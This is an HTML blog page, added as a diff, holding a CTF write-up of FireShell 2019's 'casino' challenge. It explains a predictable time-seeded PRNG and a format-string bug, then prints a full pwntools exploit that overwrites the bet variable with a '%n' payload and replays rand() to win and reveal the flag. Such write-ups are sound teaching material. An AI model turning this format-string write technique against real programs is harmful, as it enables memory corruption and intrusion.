@@ -1,0 +1,184 @@
+<!doctype html>
+
+<html lang="en-us">
+
+<head>
+  <title>Catousify</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="description" content="The HTML5 Herald" />
+  <meta name="author" content="kiror0" /><meta name="generator" content="Hugo 0.62.0" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.0/normalize.min.css" />
+  <script src="https://kit.fontawesome.com/b76b73e8e8.js" crossorigin="anonymous"></script>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Slab|Ruda" />
+  <link rel="stylesheet" type="text/css" href="http://zeroload.github.io/css/styles.css" /></head>
+
+<body>
+  <div id="container">
+    <header>
+      <h1>
+                <a href="http://zeroload.github.io/">Catousify</a>
+            </h1>
+
+      <ul id="social-media">
+        
+        
+          
+        <li><a href="https://github.com/kiror0"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a></li>
+           
+      </ul>
+      
+      <p><em>No Clever Tagline Needed.</em></p>
+      
+    </header>
+
+    
+<nav>
+    <ul>
+        
+        <li>
+            <a class="" href="http://zeroload.github.io/posts/">
+                <i class="fa-li fa  fa-lg"></i><span>Posts</span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="" href="http://zeroload.github.io/about/">
+                <i class="fa-li fa  fa-lg"></i><span>About Me</span>
+            </a>
+        </li>
+        
+    </ul>
+</nav>
+
+    <main>
+
+
+
+
+<article>
+
+    <h1>FireShell 2019 - casino</h1>
+
+    
+        <aside>
+    <ul>
+        <li>
+            <time class="post-date" datetime="2019-01-28T06:54:28Z">Jan 28, 2019</time>
+        </li>
+        
+        <li>
+            Categories:
+            <em>
+                
+                    
+                    <a href="http://zeroload.github.io/categories/pwn">pwn</a>
+                
+                    , 
+                    <a href="http://zeroload.github.io/categories/writeup">writeup</a>
+                
+            </em>
+        </li>
+        
+
+        
+
+        <li>One minute read</li>
+    </ul>
+</aside>
+
+    
+
+    <h2 id="download">download</h2>
+<ul>
+<li><a href="http://zeroload.github.io/assets/fireshell/casino/casino.zip">binary</a></li>
+<li><a href="http://zeroload.github.io/assets/fireshell/casino/solve.py">solve.py</a></li>
+</ul>
+<h2 id="summary">summary</h2>
+<ol>
+<li>PRNG seed with <code>time(0) / 10 + bet</code></li>
+<li>Guess the number game, but intended to never win the game because the loop will only reach 99 not 100</li>
+<li>format string in <code>main</code> used to overwrite <code>bet</code> with value &gt; 1, so that you can win the game</li>
+</ol>
+<h2 id="exploit">exploit</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">import</span> sys<span style="color:#f92672">,</span> ctypes
+
+context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">tmux</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">split-window</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">-h</span><span style="color:#e6db74">&#39;</span>]
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./casino</span><span style="color:#e6db74">&#39;</span>, checksec<span style="color:#f92672">=</span>False)
+
+libc <span style="color:#f92672">=</span> ctypes<span style="color:#f92672">.</span>CDLL(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">/usr/lib64/libc.so.6</span><span style="color:#e6db74">&#39;</span>)
+seed <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>time(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">/</span> <span style="color:#ae81ff">10</span>
+
+<span style="color:#66d9ef">if</span> sys<span style="color:#f92672">.</span>argv<span style="color:#f92672">.</span>__len__() <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span>:
+    r <span style="color:#f92672">=</span> remote(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>], int(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>]))
+<span style="color:#66d9ef">else</span>:
+    r <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>process(aslr<span style="color:#f92672">=</span>False)
+    gdb<span style="color:#f92672">.</span>attach(r, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">brva 0xac3</span><span style="color:#e6db74">&#39;</span>)
+
+payload  <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">___</span><span style="color:#e6db74">%</span><span style="color:#e6db74">11$n{}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(p64(<span style="color:#ae81ff">0x602020</span>)) <span style="color:#75715e"># overwrite bet with 3</span>
+r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">? </span><span style="color:#e6db74">&#39;</span>, payload)
+
+libc<span style="color:#f92672">.</span>srand(seed <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span>)
+
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">99</span>):
+    ans <span style="color:#f92672">=</span> str(libc<span style="color:#f92672">.</span>rand())
+    <span style="color:#66d9ef">print</span> r<span style="color:#f92672">.</span>recv()
+    r<span style="color:#f92672">.</span>sendline(ans)
+
+r<span style="color:#f92672">.</span>interactive()
+
+<span style="color:#75715e"># F#{buggy_c4s1n0_1s_n0t_f41r!}</span>
+</code></pre></div><h2 id="footnote">footnote</h2>
+<p>should be fairly easy, but connection problem in early CTF will get you timeout before reach loop end. Tried this a couple of times before getting a good one.</p>
+
+
+</article>
+
+
+<section class="post-nav">
+    <ul>
+        
+        <li>
+            <a href="http://zeroload.github.io/posts/fireshell-2019-leakless/"><i class="fa fa-chevron-circle-left"></i> FireShell 2019 - leakless</a>
+        </li>
+        
+        
+        <li>
+            <a href="http://zeroload.github.io/posts/fireshell-2019-babyheap/">FireShell 2019 - babyheap <i class="fa fa-chevron-circle-right"></i> </a>
+        </li>
+        
+    </ul>
+</section>
+    
+
+
+
+
+
+</main>
+    <footer>
+        <h6>Copyright © 2019 - kiror0 |
+            Rendered by <a href="https://gohugo.io" title="Hugo">Hugo</a> |
+            <a href="http://zeroload.github.io/index.xml">Subscribe</a></h6>
+    </footer>
+</div>
+<script src="http://zeroload.github.io/js/scripts.js"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-146594173-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+</body>
+
+</html>
